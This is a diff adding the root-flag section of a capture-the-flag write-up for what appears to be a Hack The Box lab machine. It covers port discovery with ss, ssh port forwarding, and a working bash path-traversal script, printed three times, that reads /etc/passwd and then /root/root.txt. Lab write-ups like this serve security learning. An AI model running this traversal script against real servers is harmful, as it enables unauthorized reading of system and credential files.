@@ -307,3 +307,130 @@ With that, we have the user flag. Let's gooooo!
 
 ## Getting the root flag
 
+After some initial digging around, I didn't find much. But fear not, one thing that I have learned to take a look at is netstat. In newer versions of linux the command has been replaced with ss, so let's run that.
+
+```
+ss -lnpt
+```
+
+The nmap options break out to the following:
+
+-l: Display only listening sockets (these are omitted by default).
+
+-n: Do not try to resolve service names.
+
+-p: Show process using socket.
+
+-t: Display TCP sockets.
+
+![](./.images/Screenshot_Root-Flag_1.png)
+
+Well that looks intresting, there is a loop back connection to port 8080. Let's try giving it a curl request...
+
+```
+curl localhost:8080
+```
+
+![](./.images/Screenshot_Root-Flag_2.png)
+
+Well there is something there, let's try gathering the headers.
+
+```
+curl --head localhost:8080
+```
+
+![](./.images/Screenshot_Root-Flag_3.png)
+
+Interesting. Let's see if we can visit this site. Were going to make an ssh listening connection so that we can proxy in.
+
+```
+ssh -L 9999:localhost:8080 rosa@10.10.11.38
+```
+
+![](./.images/Screenshot_Root-Flag_4.png)
+
+Now we simply visit that address via Firefox.
+
+![](./.images/Screenshot_Root-Flag_5.png)
+
+Although, not much we can do here, so let's go back to the information that we pulled from the headers.
+
+![](./.images/Screenshot_Root-Flag_6.png)
+
+Digging around in the github repo, it looks like all we need it the exploit.sh file.
+
+```
+#!/bin/bash
+
+url="http://localhost:8080"
+string="../"
+payload="/static/"
+file="etc/passwd" # without the first /
+
+for ((i=0; i<15; i++)); do
+    payload+="$string"
+    echo "[+] Testing with $payload$file"
+    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
+    echo -e "\tStatus code --> $status_code"
+    
+    if [[ $status_code -eq 200 ]]; then
+        curl -s --path-as-is "$url$payload$file"
+        break
+    fi
+done
+```
+Let's give that a go on the target box. Don't forget to adjust the port and give yourself execute permissions.
+
+![](./.images/Screenshot_Root-Flag_7.png)
+
+Well that didn't work. Based on the information that we have gathered from our curl requests, there is an assets folder for sure. Let's adjust the code to look there.
+
+```
+#!/bin/bash
+
+url="http://localhost:8080"
+string="../"
+payload="/assets/"
+file="etc/passwd" # without the first /
+
+for ((i=0; i<15; i++)); do
+    payload+="$string"
+    echo "[+] Testing with $payload$file"
+    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
+    echo -e "\tStatus code --> $status_code"
+    
+    if [[ $status_code -eq 200 ]]; then
+        curl -s --path-as-is "$url$payload$file"
+        break
+    fi
+done
+```
+
+![](./.images/Screenshot_Root-Flag_8.png)
+
+We all know what's coming next... The root flag is located at /root/root.txt...
+
+```
+#!/bin/bash
+
+url="http://localhost:8080"
+string="../"
+payload="/assets/"
+file="root/root.txt" # without the first /
+
+for ((i=0; i<15; i++)); do
+    payload+="$string"
+    echo "[+] Testing with $payload$file"
+    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
+    echo -e "\tStatus code --> $status_code"
+    
+    if [[ $status_code -eq 200 ]]; then
+        curl -s --path-as-is "$url$payload$file"
+        break
+    fi
+done
+```
+
+![](./.images/Screenshot_Root-Flag_9.png)
+
+Good game, thanks for playing.
